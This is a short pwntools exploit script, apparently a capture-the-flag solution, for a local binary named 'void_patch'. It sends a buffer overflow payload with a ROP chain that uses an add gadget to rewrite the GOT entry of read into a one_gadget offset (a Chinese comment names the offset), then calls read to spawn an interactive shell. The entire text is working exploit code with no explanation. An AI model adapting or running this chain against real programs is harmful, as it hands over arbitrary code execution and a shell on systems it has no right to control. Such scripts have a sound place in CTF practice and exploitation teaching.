from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./void_patch')

p = process('./void_patch')
pause()

pop_rbx_rbp_r12_r13_r14_r15 = 0x4011b2
add_rbp_ebx = 0x401108 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
payload = flat(
    b'a' * 0x48,
    pop_rbx_rbp_r12_r13_r14_r15,
    0xfffdce9a, # read地址和one_gadget的偏移量
    elf.got['read'] + 0x3d,
    0,
    0,
    0,
    0,
    add_rbp_ebx,
    elf.plt['read']
)
p.sendline(payload)

p.interactive()